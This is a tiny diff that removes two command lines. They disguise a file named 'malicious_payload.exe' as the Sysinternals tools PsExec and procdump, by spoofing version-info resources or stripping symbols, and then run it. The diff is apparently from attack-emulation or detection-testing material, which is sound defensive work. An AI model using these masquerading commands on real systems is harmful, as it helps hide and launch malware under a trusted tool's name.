@@ -1,2 +1,0 @@
-ResourceHacker.exe -open malicious_payload.exe -save PsExec.exe -action addoverwrite -res sysinternals_versioninfo.res -mask VERSIONINFO,1,1033 && .\PsExec.exe
-strip.exe --strip-all malicious_payload.exe -o procdump.exe && .\procdump.exe
